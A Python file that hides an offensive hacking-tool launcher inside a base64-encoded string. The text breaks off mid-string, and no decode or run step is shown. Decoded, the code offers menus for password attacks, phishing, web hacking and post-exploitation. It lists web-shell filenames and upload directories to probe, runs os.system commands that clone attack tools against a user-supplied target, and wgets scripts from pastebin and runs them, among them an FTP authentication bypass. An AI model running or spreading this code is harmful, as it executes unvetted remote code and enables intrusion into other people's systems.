import base64
x = (  b'''IyEvdXNyL2Jpbi9lbnYgcHl0aG9uMi43DQojDQojICBfICAgXyAgICAgICBfX18gICAgICAgX19fICBfX18gICBfX19fX18gICAgICBfX18gICAgICAgDQojIHwgfCB8IHwgICAgIC8gICB8ICAgICAvICAgfC8gICB8IHxfX18gIC8gICAgIC8gICB8ICAgICAgDQojIHwgfF98IHwgICAgLyAvfCB8ICAgIC8gL3wgICAvfCB8ICAgIC8gLyAgICAgLyAvfCB8ICAgICAgDQojIHwgIF8gIHwgICAvIC8gfCB8ICAgLyAvIHxfXy8gfCB8ICAgLyAvICAgICAvIC8gfCB8ICAgICAgDQojIHwgfCB8IHwgIC8gLyAgfCB8ICAvIC8gICAgICAgfCB8ICAvIC9fXyAgIC8gLyAgfCB8ICAgICAgDQojIHxffCB8X3wgL18vICAgfF98IC9fLyAgICAgICAgfF98IC9fX19fX3wgL18vICAgfF98ICAgICAgDQojDQojICAgICAgICAgIEhhY2tpbmcgVG9vbHMgQnktSGFtemEgQW5vbmltZQ0KDQppbXBvcnQgc3lzDQppbXBvcnQgYXJncGFyc2UNCmltcG9ydCBvcw0KaW1wb3J0IHRpbWUNCmltcG9ydCBodHRwbGliDQppbXBvcnQgc3VicHJvY2Vzcw0KaW1wb3J0IHJlDQppbXBvcnQgdXJsbGliMg0KaW1wb3J0IHNvY2tldA0KaW1wb3J0IHVybGxpYg0KaW1wb3J0IHN5cw0KaW1wb3J0IGpzb24NCmltcG9ydCB0ZWxuZXRsaWINCmltcG9ydCBnbG9iDQppbXBvcnQgcmFuZG9tDQppbXBvcnQgUXVldWUNCmltcG9ydCB0aHJlYWRpbmcNCiNpbXBvcnQgcmVxdWVzdHMNCmltcG9ydCBiYXNlNjQNCmZyb20gZ2V0cGFzcyBpbXBvcnQgZ2V0cGFzcw0KZnJvbSBjb21tYW5kcyBpbXBvcnQgKg0KZnJvbSBzeXMgaW1wb3J0IGFyZ3YNCmZyb20gcGxhdGZvcm0gaW1wb3J0IHN5c3RlbQ0KZnJvbSB1cmxwYXJzZSBpbXBvcnQgdXJscGFyc2UNCmZyb20geG1sLmRvbSBpbXBvcnQgbWluaWRvbQ0KZnJvbSBvcHRwYXJzZSBpbXBvcnQgT3B0aW9uUGFyc2VyDQpmcm9tIHRpbWUgaW1wb3J0IHNsZWVwDQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0Kb3Muc3lzdGVtKCdjbGVhcicpDQoNCg0KZGVmIG1lbnUoKToNCiAgICBwcmludCAoIiIiDQpNSVQgTGljZW5zZQ0KDQpDb3B5cmlnaHQgKGMpIDIwMjAgZnVja2FkbWluDQoNClBlcm1pc3Npb24gaXMgaGVyZWJ5IGdyYW50ZWQsIGZyZWUgb2YgY2hhcmdlLCB0byBhbnkgcGVyc29uIG9idGFpbmluZyBhIGNvcHkNCm9mIHRoaXMgc29mdHdhcmUgYW5kIGFzc29jaWF0ZWQgZG9jdW1lbnRhdGlvbiBmaWxlcyAodGhlICJTb2Z0d2FyZSIpLCB0byBkZWFsDQppbiB0aGUgU29mdHdhcmUgd2l0aG91dCByZXN0cmljdGlvbiwgaW5jbHVkaW5nIHdpdGhvdXQgbGltaXRhdGlvbiB0aGUgcmlnaHRzDQp0byB1c2UsIGNvcHksIG1vZGlmeSwgbWVyZ2UsIHB1Ymxpc2gsIGRpc3RyaWJ1dGUsIHN1YmxpY2Vuc2UsIGFuZC9vciBzZWxsDQpjb3BpZXMgb2YgdGhlIFNvZnR3YXJlLCBhbmQgdG8gcGVybWl0IHBlcnNvbnMgdG8gd2hvbSB0aGUgU29mdHdhcmUgaXMNCmZ1cm5pc2hlZCB0byBkbyBzbywgc3ViamVjdCB0byB0aGUgZm9sbG93aW5nIGNvbmRpdGlvbnM6DQoNClRoZSBhYm92ZSBjb3B5cmlnaHQgbm90aWNlIGFuZCB0aGlzIHBlcm1pc3Npb24gbm90aWNlIHNoYWxsIGJlIGluY2x1ZGVkIGluIGFsbA0KY29waWVzIG9yIHN1YnN0YW50aWFsIHBvcnRpb25zIG9mIHRoZSBTb2Z0d2FyZS4NCg0KVEhFIFNPRlRXQVJFIElTIFBST1ZJREVEICJBUyBJUyIsIFdJVEhPVVQgV0FSUkFOVFkgT0YgQU5ZIEtJTkQsIEVYUFJFU1MgT1INCklNUExJRUQsIElOQ0xVRElORyBCVVQgTk9UIExJTUlURUQgVE8gVEhFIFdBUlJBTlRJRVMgT0YgTUVSQ0hBTlRBQklMSVRZLA0KRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UgQU5EIE5PTklORlJJTkdFTUVOVC4gSU4gTk8gRVZFTlQgU0hBTEwgVEhFDQpBVVRIT1JTIE9SIENPUFlSSUdIVCBIT0xERVJTIEJFIExJQUJMRSBGT1IgQU5ZIENMQUlNLCBEQU1BR0VTIE9SIE9USEVSDQpMSUFCSUxJVFksIFdIRVRIRVIgSU4gQU4gQUNUSU9OIE9GIENPTlRSQUNULCBUT1JUIE9SIE9USEVSV0lTRSwgQVJJU0lORyBGUk9NLA0KT1VUIE9GIE9SIElOIENPTk5FQ1RJT04gV0lUSCBUSEUgU09GVFdBUkUgT1IgVEhFIFVTRSBPUiBPVEhFUiBERUFMSU5HUyBJTiBUSEUNClNPRlRXQVJFLiIiIikNCg0KDQpvcy5zeXN0ZW0oJ2NsZWFyJykNCm9zLnN5c3RlbSgnY2xlYXInKQ0Kb3Muc3lzdGVtKCdjbGVhcicpDQpvcy5zeXN0ZW0oJ2NsZWFyJykNCg0KZGlyZWN0b3JpZXMgPSBbJy91cGxvYWRzLycsICcvdXBsb2FkLycsICcvZmlsZXMvJywgJy9yZXN1bWUvJywgJy9yZXN1bWVzLycsICcvZG9jdW1lbnRzLycsICcvZG9jcy8nLCAnL3BpY3R1cmVzLycsICcvZmlsZS8nLCAnL1VwbG9hZC8nLCAnL1VwbG9hZHMvJywgJy9SZXN1bWUvJywgJy9SZXN1bWUvJywgJy9Vc2Vyc0ZpbGVzLycsICcvVXNlcnNpbGVzLycsICcvdXNlcnNGaWxlcy8nLCAnL1VzZXJzX0ZpbGVzLycsICcvVXBsb2FkZWRGaWxlcy8nLA0KICAgICAgICAgICAgICAgJy9VcGxvYWRlZF9GaWxlcy8nLCAnL3VwbG9hZGVkZmlsZXMvJywgJy91cGxvYWRlZEZpbGVzLycsICcvaHBhZ2UvJywgJy9hZG1pbi91cGxvYWQvJywgJy9hZG1pbi91cGxvYWRzLycsICcvYWRtaW4vcmVzdW1lLycsICcvYWRtaW4vcmVzdW1lcy8nLCAnL2FkbWluL3BpY3R1cmVzLycsICcvcGljcy8nLCAnL3Bob3Rvcy8nLCAnL0FsdW1uaV9QaG90b3MvJywgJy9hbHVtbmlfcGhvdG9zLycsICcvQWx1bW5pUGhvdG9zLycsICcvdXNlcnMvJ10NCnNoZWxscyA9IFsnd3NvLnBocCcsICdzaGVsbC5waHAnLCAnYW4ucGhwJywgJ2hhY2tlci5waHAnLCAnbG9sLnBocCcsICd1cC5waHAnLCAnY3AucGhwJywgJ3VwbG9hZC5waHAnLA0KICAgICAgICAgICdzaC5waHAnLCAncGsucGhwJywgJ21hZC5waHAnLCAneDAweC5waHAnLCAnd29ybS5waHAnLCAnMTMzN3dvcm0ucGhwJywgJ2NvbmZpZy5waHAnLCAneC5waHAnLCAnaGFoYS5waHAnXQ0KdXBsb2FkID0gW10NCnllcyA9IHNldChbJ3llcycsICd5JywgJ3llJywgJ1knXSkNCm5vID0gc2V0KFsnbm8nLCAnbiddKQ0KDQoNCmRlZiBsb2dvKCk6DQogICAgcHJpbnQgIiIiDQogICAgICAgICAgICAgICAgICAgICAgICAgICAtIFBvd2VyZWQgYnkNCiBfICAgXyAgICAgICBfX18gICAgICAgX19fICBfX18gICBfX19fX18gICAgICBfX18gICAgICAgDQp8IHwgfCB8ICAgICAvICAgfCAgICAgLyAgIHwvICAgfCB8X19fICAvICAgICAvICAgfCAgICAgIA0KfCB8X3wgfCAgICAvIC98IHwgICAgLyAvfCAgIC98IHwgICAgLyAvICAgICAvIC98IHwgICAgICANCnwgIF8gIHwgICAvIC8gfCB8ICAgLyAvIHxfXy8gfCB8ICAgLyAvICAgICAvIC8gfCB8ICAgICAgDQp8IHwgfCB8ICAvIC8gIHwgfCAgLyAvICAgICAgIHwgfCAgLyAvX18gICAvIC8gIHwgfCAgICAgIA0KfF98IHxffCAvXy8gICB8X3wgL18vICAgICAgICB8X3wgL19fX19ffCAvXy8gICB8X3wgICAgICANCiIiIg0KDQoNCkZVQ0tBRE1JTmxvZ28gPSAiIiJcMDMzWzBtICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICANCiANCiAgICAgIF9fX19fICAgXyAgIF8gICBfX19fXyAgIF8gICBfICAgICAgICANCnwgIF9fX3wgfCB8IHwgfCAvICBfX198IHwgfCAvIC8gICAgICAgDQp8IHxfXyAgIHwgfCB8IHwgfCB8ICAgICB8IHwvIC8gICAgICAgIA0KfCAgX198ICB8IHwgfCB8IHwgfCAgICAgfCB8XCBcICAgICAgICANCnwgfCAgICAgfCB8X3wgfCB8IHxfX18gIHwgfCBcIFwgICAgICAgDQp8X3wgICAgIFxfX19fXy8gXF9fX19ffCB8X3wgIFxfXA0KDQogICAgICAgICAgICB+VG9vbHMgRm9yIEhhbXphIEFub25pbWUgDQoNClwwMzNbOTFtIiIiDQpkZWYgbWVudSgpOg0KICAgIHByaW50IChGVUNLQURNSU5sb2dvICsgIiIiXDAzM1sxbQ0KIFshXSBUaGlzIFRvb2wgTXVzdCBSdW4gQXMgUk9PVCBbIV0gaHR0cHM6Ly9naXRodWIuY29tL0Fub25pbWU3eC9GdWNrYWRtaW4NClwwMzNbMG0NCiAgIHsxfS0tSW5mb3JtYXRpb24gR2F0aGVyaW5nDQogICB7Mn0tLVBhc3N3b3JkIEF0dGFja3MNCiAgIHszfS0tV2lyZWxlc3MgVGVzdGluZw0KICAgezR9LS1FeHBsb2l0YXRpb24gVG9vbHMNCiAgIHs1fS0tU25pZmZpbmcgJiBTcG9vZmluZw0KICAgezZ9LS1XZWIgSGFja2luZw0KICAgezd9LS1Qcml2YXRlIFdlYiBIYWNraW5nDQogICB7OH0tLVBvc3QgRXhwbG9pdGF0aW9uDQogICB7MH0tLUluc3RhbGwgVGhlIEZVY2sgYWRtaW4NCiAgIHs5OX0tRXhpdA0KICIiIikNCiAgICBjaG9pY2UgPSByYXdfaW5wdXQoIkZVQ0tBRE1JTn4jICIpDQogICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgaWYgY2hvaWNlID09ICIxIjoNCiAgICAgICAgaW5mbygpDQogICAgZWxpZiBjaG9pY2UgPT0gIjIiOg0KICAgICAgICBwYXNzd2QoKQ0KICAgIGVsaWYgY2hvaWNlID09ICIzIjoNCiAgICAgICAgd2lyZSgpDQogICAgZWxpZiBjaG9pY2UgPT0gIjQiOg0KICAgICAgICBleHAoKQ0KICAgIGVsaWYgY2hvaWNlID09ICI1IjoNCiAgICAgICAgc25pZigpDQogICAgZWxpZiBjaG9pY2UgPT0gIjYiOg0KICAgICAgICB3ZWJoYWNrKCkNCiAgICBlbGlmIGNob2ljZSA9PSAiNyI6DQogICAgICAgIGR6eigpDQogICAgZWxpZiBjaG9pY2UgPT0gIjgiOg0KICAgICAgICBwb3N0ZXhwKCkNCiAgICBlbGlmIGNob2ljZSA9PSAiMCI6DQogICAgICAgIHVwZGF0ZUZ1Y2thZG1pbigpDQogICAgZWxpZiBjaG9pY2UgPT0gIjk5IjoNCiAgICAgICAgY2xlYXJTY3IoKSwgc3lzLmV4aXQoKQ0KICAgIGVsaWYgY2hvaWNlID09ICIiOg0KICAgICAgICBtZW51KCkNCiAgICBlbHNlOg0KICAgICAgICBtZW51KCkNCg0KDQpkZWYgdXBkYXRlZnVja2FkbWluKCk6DQogICAgcHJpbnQgKCJUaGlzIFRvb2wgaXMgT25seSBBdmFpbGFibGUgZm9yIExpbnV4IGFuZCBTaW1pbGFyIFN5c3RlbXMuICIpDQogICAgY2hvaWNldXBkYXRlID0gcmF3X2lucHV0KCJDb250aW51ZSBZIC8gTjogIikNCiAgICBpZiBjaG9pY2V1cGRhdGUgaW4geWVzOg0KICAgICAgICBvcy5zeXN0ZW0oImdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vQW5vbmltZTd4L2Z1Y2thZG1pbi5naXQiKQ0KDQogICAgICAgIG9zLnN5c3RlbSgiY2QgRnVjayBhZG1pbiAmJiBzdWRvIGJhc2ggLi91cGRhdGUuc2giKQ0KICAgICAgICBvcy5zeXN0ZW0oIkZ1Y2thZG1pbiIpDQoNCg0KZGVmIGRvb3JrKCk6DQogICAgcHJpbnQoImRvb3JrIGlzIGEgb3Blbi1zb3VyY2UgcGFzc2l2ZSB2dWxuZXJhYmlsaXR5IGF1ZGl0b3IgdG9vbCB0aGF0IGF1dG9tYXRlcyB0aGUgcHJvY2VzcyBvZiBzZWFyY2hpbmcgb24gR29vZ2xlIGluZm9ybWF0aW9uIGFib3V0IHNwZWNpZmljIHdlYnNpdGUgYmFzZWQgb24gZG9ya3MuICIpDQogICAgZG9vcmtjaGljZSA9IHJhd19pbnB1dCgiQ29udGludWUgWSAvIE46ICIpDQogICAgaWYgZG9vcmtjaGljZSBpbiB5ZXM6DQogICAgICAgIG9zLnN5c3RlbSgicGlwIGluc3RhbGwgYmVhdXRpZnVsc291cDQgJiYgcGlwIGluc3RhbGwgcmVxdWVzdHMiKQ0KICAgICAgICBvcy5zeXN0ZW0oImdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vQWVvbkRhdmUvZG9vcmsiKQ0KICAgICAgICBjbGVhclNjcigpDQogICAgICAgIGRvb3JrdCA9IHJhd19pbnB1dCgiVGFyZ2V0IDogIikNCiAgICAgICAgb3Muc3lzdGVtKCJjZCBkb29yayAmJiBweXRob24gZG9vcmsucHkgLXQgJXMgLW8gbG9nLmxvZyIgJSBkb29ya3QpDQoNCg0KZGVmIHBvc3RleHAoKToNCiAgICBjbGVhclNjcigpDQogICAgcHJpbnQoRlVDS0FETUlObG9nbykNCiAgICBwcmludCgiICAgezF9LS1TaGVsbCBDaGVja2VyIikNCiAgICBwcmludCgiICAgezJ9LS1QT0VUIikNCiAgICBwcmludCgiICAgezN9LS1QaGlzaGluZyBGcmFtZXdvcmsgXG4iKQ0KICAgIHByaW50KCIgICB7OTl9LVJldHVybiB0byBtYWluIG1lbnUgXG5cbiAiKQ0KICAgIGNob2ljZTExID0gcmF3X2lucHV0KCJGdWNrYWRtaW5+IyAiKQ0KICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgIGlmIGNob2ljZTExID09ICIxIjoNCiAgICAgICAgc2l0ZWNoZWNrZXIoKQ0KICAgIGlmIGNob2ljZTExID09ICIyIjoNCiAgICAgICAgcG9ldCgpDQogICAgaWYgY2hvaWNlMTEgPT0gIjMiOg0KICAgICAgICB3ZWVtYW4oKQ0KICAgIGVsaWYgY2hvaWNlMTEgPT0gIjk5IjoNCiAgICAgICAgbWVudSgpDQoNCg0KZGVmIHNjYW51c2VycygpOg0KICAgIHNpdGUgPSByYXdfaW5wdXQoJ0VudGVyIGEgd2Vic2l0ZSA6ICcpDQogICAgdHJ5Og0KICAgICAgICB1c2VycyA9IHNpdGUNCiAgICAgICAgaWYgJ2h0dHA6Ly93d3cuJyBpbiB1c2VyczoNCiAgICAgICAgICAgIHVzZXJzID0gdXNlcnMucmVwbGFjZSgnaHR0cDovL3d3dy4nLCAnJykNCiAgICAgICAgaWYgJ2h0dHA6Ly8nIGluIHVzZXJzOg0KICAgICAgICAgICAgdXNlcnMgPSB1c2Vycy5yZXBsYWNlKCdodHRwOi8vJywgJycpDQogICAgICAgIGlmICcuJyBpbiB1c2VyczoNCiAgICAgICAgICAgIHVzZXJzID0gdXNlcnMucmVwbGFjZSgnLicsICcnKQ0KICAgICAgICBpZiAnLScgaW4gdXNlcnM6DQogICAgICAgICAgICB1c2VycyA9IHVzZXJzLnJlcGxhY2UoJy0nLCAnJykNCiAgICAgICAgaWYgJy8nIGluIHVzZXJzOg0KICAgICAgICAgICAgdXNlcnMgPSB1c2Vycy5yZXBsYWNlKCcvJywgJycpDQogICAgICAgIHdoaWxlIGxlbih1c2VycykgPiAyOg0KICAgICAgICAgICAgcHJpbnQgdXNlcnMNCiAgICAgICAgICAgIHJlc3AgPSB1cmxsaWIyLnVybG9wZW4oDQogICAgICAgICAgICAgICAgc2l0ZSArICcvY2dpLXN5cy9ndWVzdGJvb2suY2dpP3VzZXI9JXMnICUgdXNlcnMpLnJlYWQoKQ0KDQogICAgICAgICAgICBpZiAnaW52YWxpZCB1c2VybmFtZScgbm90IGluIHJlc3AubG93ZXIoKToNCiAgICAgICAgICAgICAgICBwcmludCAiXHRGb3VuZCAtPiAlcyIgJSB1c2Vycw0KICAgICAgICAgICAgICAgIHBhc3MNCg0KICAgICAgICAgICAgdXNlcnMgPSB1c2Vyc1s6LTFdDQogICAgZXhjZXB0Og0KICAgICAgICBwYXNzDQoNCg0KZGVmIGJydXRleCgpOg0KICAgIGNsZWFyU2NyKCkNCiAgICBwcmludCgiQXV0b21hdGljYWxseSBicnV0ZSBmb3JjZSBhbGwgc2VydmljZXMgcnVubmluZyBvbiBhIHRhcmdldCA6IE9wZW4gcG9ydHMgLyBETlMgZG9tYWlucyAvIFVzZXJuYW1lcyAvIFBhc3N3b3JkcyAiKQ0KICAgIG9zLnN5c3RlbSgiZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS8xTjMvQnJ1dGVYLmdpdCIpDQogICAgY2xlYXJTY3IoKQ0KICAgIGJydXRleGNob2ljZSA9IHJhd19pbnB1dCgiU2VsZWN0IGEgVGFyZ2V0IDogIikNCiAgICBvcy5zeXN0ZW0oImNkIEJydXRlWCAmJiBjaG1vZCA3NzcgYnJ1dGV4ICYmIC4vYnJ1dGV4ICVzIiAlIGJydXRleGNob2ljZSkNCg0KDQpkZWYgYXJhY2huaSgpOg0KICAgIHByaW50KCJBcmFjaG5pIGlzIGEgZmVhdHVyZS1mdWxsLCBtb2R1bGFyLCBoaWdoLXBlcmZvcm1hbmNlIFJ1YnkgZnJhbWV3b3JrIGFpbWVkIHRvd2FyZHMgaGVscGluZyBwZW5ldHJhdGlvbiB0ZXN0ZXJzIGFuZCBhZG1pbmlzdHJhdG9ycyBldmFsdWF0ZSB0aGUgc2VjdXJpdHkgb2Ygd2ViIGFwcGxpY2F0aW9ucyIpDQogICAgY2FyYSA9IHJhd19pbnB1dCgiSW5zdGFsbCBBbmQgUnVuID8gWSAvIE4gOiAiKQ0KICAgIGNsZWFyU2NyKCkNCiAgICBwcmludCgiZXhlbXBsZSA6IGh0dHA6Ly93d3cudGFyZ2V0LmNvbS8iKQ0KICAgIHRhcmEgPSByYXdfaW5wdXQoIlNlbGVjdCBhIHRhcmdldCB0byBzY2FuIDogIikNCiAgICBpZiBjYXJhIGluIHllczogICAgICAgIA0KICAgICAgICBvcy5zeXN0ZW0oImdpdCBjbG9uZSBnaXQ6Ly9naXRodWIuY29tL0FyYWNobmkvYXJhY2huaS5naXQiKQ0KICAgICAgICBvcy5zeXN0ZW0oDQogICAgICAgICAgICAiY2QgYXJhY2huaSAmJiBzdWRvIGdlbSBpbnN0YWxsIGJ1bmRsZXIgJiYgYnVuZGxlIGluc3RhbGwgLS13aXRob3V0IHByb2YgJiYgcmFrZSBpbnN0YWxsIikNCiAgICAgICAgb3Muc3lzdGVtKCJhcmNoYW5pIikNCiAgICBjbGVhclNjcigpDQogICAgb3Muc3lzdGVtKCJjZCBhcmFjaG5pL2JpbiAmJiBjaG1vZCA3NzcgYXJhY2huaSAmJiAuL2FyYWNobmkgJXMiICUgdGFyYSkNCg0KDQpkZWYgWFNTdHJpa2UoKToNCiAgICBjbGVhclNjcigpDQogICAgcHJpbnQoIlhTU3RyaWtlIGlzIGEgcHl0aG9uIHNjcmlwdCBkZXNpZ25lZCB0byBkZXRlY3QgYW5kIGV4cGxvaXQgWFNTIHZ1bG5lcmFiaWxpdGVzLiBGb2xsb3cgVGhlIE93bmVyIE9uIEdpdGh1YiBAVWx0aW1hdGVIYWNrZXJzIikNCiAgICBvcy5zeXN0ZW0oInN1ZG8gcm0gLXJmIFhTU3RyaWtlIikNCiAgICBvcy5zeXN0ZW0oImdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vVWx0aW1hdGVIYWNrZXJzL1hTU3RyaWtlLmdpdCAmJiBjZCBYU1N0cmlrZSAmJiBwaXAgaW5zdGFsbCAtciByZXF1aXJlbWVudHMudHh0ICYmIGNsZWFyICYmIHB5dGhvbiB4c3N0cmlrZSIpDQoNCg0KZGVmIGNyaXBzKCk6DQogICAgY2xlYXJTY3IoKQ0KICAgIG9zLnN5c3RlbSgiZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9NYW5pc3NvL0NyaXBzLmdpdCIpDQogICAgb3Muc3lzdGVtKCJjZCBDcmlwcyAmJiBzdWRvIGJhc2ggLi91cGRhdGUuc2giKQ0KICAgIG9zLnN5c3RlbSgiY3JpcHMiKQ0KICAgIG9zLnN5c3RlbSgiY2xlYXIiKQ0KDQoNCmRlZiB3ZWVtYW4oKToNCiAgICBwcmludCgiSFRUUCBzZXJ2ZXIgZm9yIHBoaXNoaW5nIGluIHB5dGhvbi4gKGFuZCBmcmFtZXdvcmspIFVzdWFsbHkgeW91IHdpbGwgd2FudCB0byBydW4gV2VlbWFuIHdpdGggRE5TIHNwb29mIGF0dGFjay4gKHNlZSBkc25pZmYsIGV0dGVyY2FwKS4iKQ0KICAgIGNob2ljZXdlZSA9IHJhd19pbnB1dCgiSW5zdGFsbCBXZWVtYW4gPyBZIC8gTiA6ICIpDQogICAgaWYgY2hvaWNld2VlIGluIHllczoNCiAgICAgICAgb3Muc3lzdGVtKA0KICAgICAgICAgICAgImdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vc2FteW95by93ZWVtYW4uZ2l0ICYmIGNkIHdlZW1hbiAmJiBweXRob24gd2VlbWFuLnB5IikNCiAgICBpZiBjaG9pY2V3ZWUgaW4gbm86DQogICAgICAgIG1lbnUoKQ0KICAgIGVsc2U6DQogICAgICAgIG1lbnUoKQ0KDQoNCmRlZiBnYWJyaWVsKCk6DQogICAgcHJpbnQoIkFidXNpbmcgYXV0aGVudGljYXRpb24gYnlwYXNzIG9mIE9wZW4mQ29tcGFjdCAoR2FicmllbCdzKSIpDQogICAgb3Muc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9wYXN0ZWJpbi5jb20vcmF3L1N6ZzIweVVoIC0tb3V0cHV0LWRvY3VtZW50PWdhYnJpZWwucHkiKQ0KICAgIGNsZWFyU2NyKCkNCiAgICBvcy5zeXN0ZW0oInB5dGhvbiBnYWJyaWVsLnB5IikNCiAgICBmdHBieXBhc3MgPSByYXdfaW5wdXQoIkVudGVyIFRhcmdldCBJUCBhbmQgVXNlIENvbW1hbmQgOiIpDQogICAgb3Muc3lzdGVtKCJweXRob24gZ2FicmllbC5weSAlcyIgJSBmdHBieXBhc3MpDQoNCg0KZGVmIHNpdGVjaGVja2VyKCk6DQogICAgb3Muc3lzdGVtKCJ3Z2V0IGh0dHA6Ly9wYXN0ZWJpbi5jb20vcmF3L1kwY3FranJqIC0tb3V0cHV0LWRvY3VtZW50PWNoMDEucHkiKQ0KICAgIGNsZWFyU2NyKCkNCiAgICBvcy5zeXN0ZW0oInB5dGhvbiBjaDAxLnB5IikNCg0KDQpkZWYgaDJpcCgpOg0KICAgIGhvc3QgPSByYXdfaW5wdXQoIlNlbGVjdCBBIEhvc3QgOiAiKQ0KICAgIGlwcyA9IHNvY2tldC5nZXRob3N0YnluYW1lKGhvc3QpDQogICAgcHJpbnQoaXBzKQ0KDQoNCmRlZiBwb3J0cygpOg0KICAgIGNsZWFyU2NyKCkNCiAgICB0YXJnZXQgPSByYXdfaW5wdXQoJ1NlbGVjdCBhIFRhcmdldCBJUCA6ICcpDQogICAgb3Muc3lzdGVtKCJubWFwIC1PIC1QbiAlcyIgJSB0YXJnZXQpDQogICAgc3lzLmV4aXQoKQ0KDQoNCmRlZiBpZmludXJsKCk6DQogICAgcHJpbnQiIiIgVGhpcyBBZHZhbmNlZCBzZWFyY2ggaW4gc2VhcmNoIGVuZ2luZXMsIGVuYWJsZXMgYW5hbHlzaXMgcHJvdmlkZWQgdG8gZXhwbG9pdCBHRVQgLyBQT1NUIGNhcHR1cmluZyBlbWFpbHMgJiB1cmxzLCB3aXRoIGFuIGludGVybmFsIGN1c3RvbSB2YWxpZGF0aW9uIGp1bmN0aW9uIGZvciBlYWNoIHRhcmdldCAvIHVybCBmb3VuZC4iIiINCiAgICBwcmludCgnRG8gWW91IFdhbnQgVG8gSW5zdGFsbCBJbnVybEJSID8gJykNCiAgICBjaW51cmwgPSByYXdfaW5wdXQoIlkvTjogIikNCiAgICBpZiBjaW51cmwgaW4geWVzOg0KICAgICAgICBpbnVybCgpDQogICAgaWYgY2ludXJsIGluIG5vOg0KICAgICAgICBtZW51KCkNCiAgICBlbGlmIGNpbnVybCA9PSAiIjoNCiAgICAgICAgbWVudSgpDQogICAgZWxzZToNCiAgICAgICAgbWVudSgpDQoNCg0KZGVmIGJzcWxiZigpOg0KICAgIGNsZWFyU2NyKCkNCiAgICBwcmludCgiVGhpcyB0b29sIHdpbGwgb25seSB3b3JrIG9uIGJsaW5kIHNxbCBpbmplY3Rpb24iKQ0KICAgIGNic3EgPSByYXdfaW5wdXQoInNlbGVjdCB0YXJnZXQgOiAiKQ0KICAgIG9zLnN5c3RlbSgid2dldCBodHRwczovL3N0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vZ29vZ2xlLWNvZGUtYXJjaGl2ZS1kb3dubG9hZHMvdjIvY29kZS5nb29nbGUuY29tL2JzcWxiZi12Mi9ic3FsYmYtdjItNy5wbCAtbyBic3FsYmYucGwiKQ0KICAgIG9zLnN5c3RlbSgicGVybCBic3FsYmYucGwgLXVybCAlcyIgJSBjYnNxKQ0KICAgIG9zLnN5c3RlbSgicm0gYnNxbGJmLnBsIikNCg0KDQpkZWYgYXRzY2FuKCk6DQogICAgcHJpbnQgKCJEbyBZb3UgVG8gSW5zdGFsbCBBVFNDQU4gPyIpDQogICAgY2hvaWNlc2hlbGwgPSByYXdfaW5wdXQoIlkvTjogIikNCiAgICBpZiBjaG9pY2VzaGVsbCBpbiB5ZXM6DQogICAgICAgIG9zLnN5c3RlbSgic3VkbyBybSAtcmYgQVRTQ0FOIikNCiAgICAgICAgb3Muc3lzdGVtKA0KICAgICAgICAgICAgImdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20vQWxpc2FtVGVjaG5vbG9neS9BVFNDQU4uZ2l0ICYmIGNkIEFUU0NBTiAmJiBwZXJsIGF0c2Nhbi5wbCIpDQogICAgZWxpZiBjaG9pY2VzaGVsbCBpbiBubzoNCiAgICAgICAgb3Muc3lzdGVtKCdjbGVhcicpDQogICAgICAgIG1lbnUoKQ0KDQoNCmRlZiBjb21taXgoKToNCiAgICBwcmludCAoIkF1dG9tYXRlZCBBbGwtaW4tT25lIE9TIENvbW1hbmQgSW5qZWN0aW9uIGFuZCBFeHBsb2l0YXRpb24gVG9vbC4iKQ0KICAgIHByaW50ICgidXNhZ2UgOiBweXRob24gY29tbWl4LnB5IC0taGVscCIpDQogICAgY2hvaWNlY214ID0gcmF3X2lucHV0KCJDb250aW51ZTogeS9uIDoiKQ0KICAgIGlmIGNob2ljZWNteCBpbiB5ZXM6DQogICAgICAgIG9zLnN5c3RlbSgiZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9zdGFzaW5vcG91bG9zL2NvbW1peC5naXQgY29tbWl4IikNCiAgICAgICAgb3Muc3lzdGVtKCJjZCBjb21taXgiKQ0KICAgICAgICBvcy5zeXN0ZW0oInB5dGhvbiBjb21taXgucHkiKQ0KICAgICAgICBvcy5zeXN0ZW0oIiIpDQogICAgZWxpZiBjaG9pY2VjbXggaW4gbm86DQogICAgICAgIG9zLnN5c3RlbSgnY2xlYXInKQ0KICAgICAgICBpbmZvKCkNCg0KDQpkZWYgcGl4aWV3cHMoKToNCiAgICBwcmludCIiIlBpeGlld3BzIGlzIGEgdG9vbCB3cml0dGVuIGluIEMgdXNlZCB0byBicnV0ZWZvcmNlIG9mZmxpbmUgdGhlIFdQUyBwaW4gZXhwbG9pdGluZyB0aGUgbG93IG9yIG5vbi1leGlzdGluZyBlbnRyb3B5IG9mIHNvbWUgQWNjZXNzIFBvaW50cywgdGhlIHNvLWNhbGxlZCAicGl4aWUgZHVzdCBhdHRhY2siIGRpc2NvdmVyZWQgYnkgRG9taW5pcXVlIEJvbmdhcmQgaW4gc3VtbWVyIDIwMTQuIEl0IGlzIG1lYW50IGZvciBlZHVjYXRpb25hbCBwdXJwb3NlcyBvbmx5DQogICAgIiIiDQogICAgY2hvaWNld3BzID0gcmF3X2lucHV0KCJDb250aW51ZSA/IFkvTiA6ICIpDQogICAgaWYgY2hvaWNld3BzIGluIHllczoNCiAgICAgICAgb3Muc3lzdGVtKCJnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL3dpaXJlL3BpeGlld3BzLmdpdCIpDQogICAgICAgIG9zLnN5c3RlbSgiY2QgcGl4aWV3cHMgJiBtYWtlICIpDQogICAgICAgIG9zLnN5c3RlbSgic3VkbyBtYWtlIGluc3RhbGwiKQ0KICAgIGlmIGNob2ljZXdwcyBpbiBubzoNCiAgICAgICAgbWVudSgpDQogICAgZWxpZiBjaG9pY2V3cHMgPT0gIiI6DQogICAgICAgIG1lbnUoKQ0KIC